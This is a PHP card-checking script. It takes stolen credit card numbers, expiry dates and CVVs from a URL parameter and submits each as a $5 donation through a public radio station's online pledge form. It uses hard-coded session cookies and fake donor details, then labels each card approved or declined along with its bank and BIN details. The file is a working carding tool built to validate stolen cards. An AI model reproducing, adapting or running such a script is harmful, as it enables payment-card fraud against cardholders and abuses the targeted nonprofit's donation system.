<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://members.whro.org/pledge.ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: members.whro.org',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie: WHROpledge=k%2FCno31Ej4bLXd5U4vuHYOWscDXajMOtVAdIKhnx9rA%3D; __utma=167656568.334367602.1545241054.1545241054.1545241054.1; __utmc=167656568; __utmz=167656568.1545241054.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; _fbp=fb.1.1545241054804.510200335; _ga=GA1.2.334367602.1545241054; _gid=GA1.2.1366403510.1545241055; _cb_ls=1; _cb=DaSgeACrx0dTDt3o0n; _chartbeat2=.1545241058124.1545241058124.1.DN4VDFCtC1mnDBPbtJBbTmAMCmmtCZ.1; _cb_svref=null; __utmb=167656568.3.8.1545241137157; _gali=savePledge',
'Referer: https://members.whro.org/pledge.php'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'data%5BcontactId%5D=&data%5BcontactId2%5D=&data%5Bsource%5D=online&data%5BsourceCode%5D=&data%5Bprogram%5D=&data%5Bvolunteer%5D=&data%5Btitle%5D=Mr.&data%5Bfname%5D=dwada&data%5Bmname%5D=dadawd&data%5Blname%5D=awddawda&data%5Btitle2%5D=Mr.&data%5Bfname2%5D=adwawd&data%5Bmname2%5D=adwaw&data%5Blname2%5D=ddadwa&data%5Bemail%5D=jhhggjgj%40gmail.com&data%5Bphone%5D=6234451117&data%5Baddress%5D=street+38xx&data%5Baddress2%5D=&data%5Bcity%5D=new+york&data%5Bstate%5D=NM&data%5Bzip%5D=10080&data%5Bemployer%5D=&data%5BdonationType%5D=normal&data%5Bamount%5D=5.00&data%5Bterm%5D=&data%5BpaymentType%5D=CREDITCARD&data%5Bccnum%5D='.$cc.'&data%5Bccmonth%5D='.$mes.'&data%5Bccyear%5D='.$ano.'&data%5Bbankid%5D=&data%5Bbankacct%5D=&data%5Bgift%5D=NOGIFT&data%5Bcdname%5D=&data%5Bshippingfee%5D=&data%5Bstation%5D=FMWHRO&data%5Bthankyoutext%5D=&data%5BnewMember%5D=&data%5Bcomments%5D=sfssff+&data%5BWHROpledge%5D=7TqP%2BZFoXXRY5ASr%2B2fdbV%2B9lpFAmEHOKN5cnzQbTRs%3D&data%5Bf%5D=save');
$fim = curl_exec($ch);



$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';



if(strpos($fim, 'OK') !== false) {
	echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
} else {
	echo '<span class="badge badge-danger">#Reprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
}


?>